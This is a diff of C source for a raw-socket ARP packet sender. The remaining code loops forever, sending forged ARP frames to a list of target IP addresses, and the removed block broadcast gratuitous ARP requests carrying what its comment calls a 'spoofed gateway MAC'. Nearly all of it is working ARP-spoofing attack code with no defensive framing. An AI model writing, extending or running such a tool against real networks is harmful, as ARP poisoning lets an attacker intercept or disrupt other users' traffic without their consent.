@@ -13,6 +13,7 @@
 #define ARP_PKT_LEN sizeof(struct ether_arp)
 #define BUF_SIZE   (ETH_HDR_LEN + ARP_PKT_LEN)
 
+// parse “aa:bb:cc:dd:ee:ff” into 6 bytes
 int parse_mac(const char *str, unsigned char *bytes) {
     int vals[6];
     if (6 == sscanf(str, "%x:%x:%x:%x:%x:%x",
@@ -83,41 +84,15 @@ int main(int argc, char *argv[]) {
 
     unsigned char buffer[ETH_ZLEN] = {0};
 
-    // Endless loop: send gratuitous ARP request, then iterate over each IP in list, send replies, then sleep
+    // Endless loop: iterate over each IP in list, send, then sleep
     while (1) {
-        // --- ARP Request for gateway IP ---
-        {
-            struct ether_header garp_eh;
-            // Broadcast dest, spoofed gateway MAC as source
-            memset(garp_eh.ether_dhost, 0xff, ETH_ALEN);
-            memcpy(garp_eh.ether_shost, src_mac,   ETH_ALEN);
-            garp_eh.ether_type = htons(ETH_P_ARP);
-
-            struct ether_arp garp_req = arp;
-            garp_req.ea_hdr.ar_op = htons(ARPOP_REQUEST);
-            memcpy(garp_req.arp_sha, src_mac, sizeof(garp_req.arp_sha));
-            memcpy(&garp_req.arp_spa, &src_ip, sizeof(src_ip));
-            memset(garp_req.arp_tha, 0x00, ETH_ALEN);
-            memcpy(&garp_req.arp_tpa, &src_ip, sizeof(src_ip));
-
-            unsigned char req_buf[ETH_ZLEN] = {0};
-            memcpy(req_buf, &garp_eh, sizeof(garp_eh));
-            memcpy(req_buf + sizeof(garp_eh), &garp_req, sizeof(garp_req));
-
-            struct sockaddr_ll garp_sa = sa;
-            memset(garp_sa.sll_addr, 0xff, ETH_ALEN);
-
-            sendto(sock, req_buf, sizeof(req_buf), 0,
-                   (struct sockaddr*)&garp_sa, sizeof(garp_sa));
-        }
-
         char *list_copy = strdup(dst_list);
         if (!list_copy) break;
         char *token = strtok(list_copy, ",");
         while (token) {
             struct in_addr dst_ip;
             if (inet_pton(AF_INET, token, &dst_ip) == 1) {
-                // Set target fields for ARP reply
+                // Set target fields
                 memset(arp.arp_tha, 0x00, ETH_ALEN);
                 memcpy(&arp.arp_tpa, &dst_ip, sizeof(dst_ip));
                 memcpy(eh.ether_dhost, dst_mac, ETH_ALEN);
@@ -128,9 +103,7 @@ int main(int argc, char *argv[]) {
                 memcpy(buffer + sizeof(eh), &arp, sizeof(arp));
 
                 size_t frame_len = sizeof(buffer);  // 60
-                if (sendto(sock, buffer, frame_len, 0,
-                           (struct sockaddr*)&sa, sizeof(sa)) < 0) {
-                }
+                if (sendto(sock, buffer, frame_len, 0, (struct sockaddr*)&sa, sizeof(sa)) < 0) {}
             }
             token = strtok(NULL, ",");
             usleep((useconds_t)(sleep_sec * 1e6));
